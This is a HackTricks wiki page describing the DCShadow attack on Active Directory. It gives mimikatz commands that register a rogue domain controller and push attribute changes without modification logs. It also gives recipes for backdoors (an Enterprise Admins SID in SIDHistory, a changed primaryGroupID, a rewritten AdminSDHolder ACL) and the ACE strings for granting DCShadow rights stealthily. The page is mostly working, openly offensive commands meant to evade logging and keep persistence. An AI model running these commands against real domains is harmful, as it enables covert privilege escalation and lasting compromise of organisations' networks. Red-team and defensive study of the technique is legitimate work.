

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.

To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Needs DA or similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

You can push the changes from a DA or from a user with this minimal permissions:

* In the **domain object**:
  * _DS-Install-Replica_ (Add/Remove Replica in Domain)
  * _DS-Replication-Manage-Topology_ (Manage Replication Topology)
  * _DS-Replication-Synchronize_ (Replication Synchornization)
* The **Sites object** (and its children) in the **Configuration container**:
  * _CreateChild and DeleteChild_
* The object of the **computer which is registered as a DC**:
  * _WriteProperty_ (Not Write)
* The **target object**:
  * _WriteProperty_ (Not Write)

You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.

## Using DCShadow to create backdoors

{% code title="Set Enterprise Admins in SIDHistory to a user" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
```
{% endcode %}

{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

We need to append following ACEs with our user's SID at the end:

* On the domain object:
  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* On the attacker computer object: `(A;;WP;;;UserSID)`
* On the target user object: `(A;;WP;;;UserSID)`
* On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`

To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.



[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


